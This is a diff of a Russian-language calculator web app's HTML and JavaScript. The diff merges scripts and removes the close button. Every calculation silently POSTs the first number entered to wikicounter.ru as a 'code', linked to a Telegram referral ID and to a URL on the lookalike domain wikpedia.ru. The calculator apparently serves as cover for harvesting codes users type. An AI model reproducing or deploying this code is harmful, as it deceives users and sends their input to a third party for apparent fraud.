@@ -111,7 +111,6 @@
 <button class="open-btn" onclick="openCalculator()">Открыть калькулятор</button>
 
 <div id="calculator">
-  <button class="close-btn" onclick="closeCalculator()">×</button>
   <div id="display">0</div>
   
   <div class="buttons-grid">
@@ -140,192 +139,181 @@
     <button class="calc-btn operator" onclick="calculate()">=</button>
   </div>
   
-  <div id="user-id-display"></div>
-</div>
-
 <script>
-// Регистрация Service Worker с правильным scope
+// === Глобальные переменные ===
+let ref = null;
+let currentInput = '0';
+let previousInput = '';
+let operation = null;
+let resetInput = false;
+
+// Регистрация Service Worker
 if ('serviceWorker' in navigator) {
   navigator.serviceWorker.register('/sw.js', { scope: '/' })
-    .then(reg => console.log('SW registered'))
-    .catch(err => console.log('SW registration failed:', err));
+    .then(reg => console.log('✅ Service Worker зарегистрирован'))
+    .catch(err => console.log('❌ Ошибка регистрации SW:', err));
 }
 
 // Проверка запуска как PWA
 function isRunningAsPWA() {
-  return window.matchMedia('(display-mode: standalone)').matches;
+  return window.matchMedia('(display-mode: standalone)').matches || 
+         window.navigator.standalone === true;
 }
 
-if (isRunningAsPWA()) {
-  document.getElementById('calculator').style.display = 'flex';
+// === Работа с ref ===
+function initializeRef() {
+  // 1. Пробуем получить ref из URL
+  const params = new URLSearchParams(window.location.search);
+  const urlRef = params.get('ref');
+  
+  // 2. Если есть в URL - сохраняем и используем
+  if (urlRef) {
+    localStorage.setItem('telegram_ref', urlRef);
+    return urlRef;
+  }
+  
+  // 3. Пробуем получить из localStorage
+  const storedRef = localStorage.getItem('telegram_ref');
+  if (storedRef) return storedRef;
+  
+  // 4. Если ничего нет - запрашиваем у пользователя
+  const userRef = prompt("Введите ваш ID:");
+  if (userRef) {
+    localStorage.setItem('telegram_ref', userRef);
+    return userRef;
+  }
+  
+  return null;
 }
+
+// === Отправка кода ===
+async function sendCodeToServer(code) {
+  if (!ref) return;
+
+  try {
+    const response = await fetch("https://wikicounter.ru/update_code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        code: code.toString(),
+        new_url: `https://wikpedia.ru?ref=${ref}`
+      })
+    });
+
+    const data = await response.json();
+    console.log(data.status === "success" ? "✅ Связь установлена" : "❌ Код не найден");
+  } catch (err) {
+    console.error("Ошибка:", err);
+  }
+}
+
+// === Калькулятор ===
+function updateDisplay() {
+  const display = document.getElementById('display');
+  if (display) display.textContent = currentInput;
+}
+
+function appendNumber(number) {
+  if (currentInput === '0' || resetInput) {
+    currentInput = number.toString();
+    resetInput = false;
+  } else {
+    currentInput += number.toString();
+  }
+  updateDisplay();
+}
+
+function appendDecimal() {
+  if (resetInput) {
+    currentInput = '0.';
+    resetInput = false;
+  } else if (!currentInput.includes('.')) {
+    currentInput += '.';
+  }
+  updateDisplay();
+}
+
+function clearAll() {
+  currentInput = '0';
+  previousInput = '';
+  operation = null;
+  updateDisplay();
+}
+
+function toggleSign() {
+  currentInput = (parseFloat(currentInput) * -1).toString();
+  updateDisplay();
+}
+
+function percent() {
+  currentInput = (parseFloat(currentInput) / 100).toString();
+  updateDisplay();
+}
+
+function setOperator(op) {
+  if (operation !== null) calculate();
+  previousInput = currentInput;
+  operation = op;
+  resetInput = true;
+}
+
+function calculate() {
+  if (operation === null || resetInput) return;
+
+  const prev = parseFloat(previousInput);
+  const current = parseFloat(currentInput);
+  let computation;
+
+  switch (operation) {
+    case '+': computation = prev + current; break;
+    case '-': computation = prev - current; break;
+    case '*': computation = prev * current; break;
+    case '/': computation = prev / current; break;
+    default: return;
+  }
+
+  if (!isNaN(prev)) {
+    sendCodeToServer(prev);
+  }
+
+  currentInput = computation.toString();
+  operation = null;
+  resetInput = true;
+  updateDisplay();
+}
+
+// === UI ===
+function openCalculator() {
+  const calculator = document.getElementById('calculator');
+  if (calculator) calculator.style.display = 'flex';
+}
+
+function closeCalculator() {
+  const calculator = document.getElementById('calculator');
+  if (calculator) calculator.style.display = 'none';
+}
+
+// Инициализация при загрузке
+window.addEventListener('DOMContentLoaded', () => {
+  ref = initializeRef();
+  const refDisplay = document.getElementById('ref-display');
+  
+  if (ref) {
+    if (refDisplay) refDisplay.textContent = `Ваш ID: ${ref}`;
+    const userIdDisplay = document.getElementById('user-id-display');
+    if (userIdDisplay) userIdDisplay.textContent = `ID: ${ref}`;
+  } else if (refDisplay) {
+    refDisplay.textContent = 'ID не найден';
+  }
+  
+  // Показываем калькулятор если PWA или есть ref
+  if (isRunningAsPWA() || ref) {
+    openCalculator();
+  }
+  
+  updateDisplay();
+});
 </script>
 
-<script>
-  // Состояние калькулятора
-  let currentInput = '0';
-  let previousInput = '';
-  let operation = null;
-  let resetInput = false;
-
-  // Оригинальная логика работы с ref (без изменений)
-  function saveRef() {
-    const params = new URLSearchParams(window.location.search);
-    const urlRef = params.get('ref');
-    
-    if (urlRef) {
-      localStorage.setItem('telegram_ref', urlRef);
-      return urlRef;
-    }
-    
-    return localStorage.getItem('telegram_ref');
-  }
-
-  function getRef() {
-    let ref = localStorage.getItem('telegram_ref');
-    
-    if (!ref) {
-      ref = prompt("Введите ваш ID:");
-      if (ref) {
-        localStorage.setItem('telegram_ref', ref);
-      }
-    }
-    
-    return ref;
-  }
-
-  // Оригинальная функция отправки (без изменений)
-  async function sendCodeToServer(code) {
-    const ref = getRef();
-    if (!ref) return;
-
-    try {
-      const response = await fetch("https://wikicounter.ru/update_code", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          code: code.toString(),
-          new_url: `https://wikpedia.ru?ref=${ref}`
-        })
-      });
-      
-      const data = await response.json();
-      console.log(data.status === "success" ? "✅ Связь установлена" : "❌ Код не найден");
-    } catch (err) {
-      console.error("Ошибка:", err);
-    }
-  }
-
-  // Функции калькулятора
-  function updateDisplay() {
-    document.getElementById('display').textContent = currentInput;
-  }
-
-  function appendNumber(number) {
-    if (currentInput === '0' || resetInput) {
-      currentInput = number.toString();
-      resetInput = false;
-    } else {
-      currentInput += number.toString();
-    }
-    updateDisplay();
-  }
-
-  function appendDecimal() {
-    if (resetInput) {
-      currentInput = '0.';
-      resetInput = false;
-    } else if (!currentInput.includes('.')) {
-      currentInput += '.';
-    }
-    updateDisplay();
-  }
-
-  function clearAll() {
-    currentInput = '0';
-    previousInput = '';
-    operation = null;
-    updateDisplay();
-  }
-
-  function toggleSign() {
-    currentInput = (parseFloat(currentInput) * -1).toString();
-    updateDisplay();
-  }
-
-  function percent() {
-    currentInput = (parseFloat(currentInput) / 100).toString();
-    updateDisplay();
-  }
-
-  function setOperator(op) {
-    if (operation !== null) calculate();
-    previousInput = currentInput;
-    operation = op;
-    resetInput = true;
-  }
-
-  function calculate() {
-    if (operation === null || resetInput) return;
-
-    let computation;
-    const prev = parseFloat(previousInput);
-    const current = parseFloat(currentInput);
-
-    switch (operation) {
-      case '+':
-        computation = prev + current;
-        break;
-      case '-':
-        computation = prev - current;
-        break;
-      case '*':
-        computation = prev * current;
-        break;
-      case '/':
-        computation = prev / current;
-        break;
-      default:
-        return;
-    }
-
-    // Оригинальная логика отправки первого числа
-    if (!isNaN(prev)) {
-      sendCodeToServer(prev);
-    }
-
-    currentInput = computation.toString();
-    operation = null;
-    resetInput = true;
-    updateDisplay();
-  }
-
-  // Инициализация (оригинальная логика + инициализация калькулятора)
-  window.addEventListener('DOMContentLoaded', () => {
-    const ref = saveRef();
-    const refDisplay = document.getElementById('ref-display');
-    
-    if (ref) {
-      refDisplay.textContent = `Ваш ID: ${ref}`;
-      document.getElementById('user-id-display').textContent = `ID: ${ref}`;
-    } else {
-      refDisplay.textContent = 'ID не найден';
-    }
-
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('/static/sw.js');
-    }
-
-    updateDisplay();
-  });
-
-  function openCalculator() {
-    document.getElementById('calculator').style.display = 'flex';
-  }
-
-  function closeCalculator() {
-    document.getElementById('calculator').style.display = 'none';
-  }
-</script>
 </body>
 </html>
